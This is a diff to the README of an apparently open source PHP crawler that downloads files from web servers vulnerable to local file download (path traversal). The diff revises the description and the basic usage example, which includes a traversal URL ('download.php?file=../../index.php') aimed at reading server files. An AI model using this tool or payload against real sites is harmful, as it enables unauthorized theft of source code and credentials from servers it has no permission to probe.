@@ -3,6 +3,7 @@
 > ASZone - Crawler - Download File By Local File Download
 
 ### Beta
+> Download File By Local File Download is a open source tool for download files extracted of system with fail of Local File Download / Path Director
 
 ## Instalation
 
@@ -23,9 +24,9 @@ php composer.phar require aszone/crawler/download-file-by-lfd
 ## Basic Usage
 ```bash
 $command=array();
+$crawler = new DownloadByLocalFileDownload($command);
 $url="http://www.xxxx.com/download.php?file=../../index.php";
-$crawler = new DownloadByLocalFileDownload($command,$url);
-$crawler->getAllFiles();
+$crawler->getAllFiles($url);
 
 ```
 
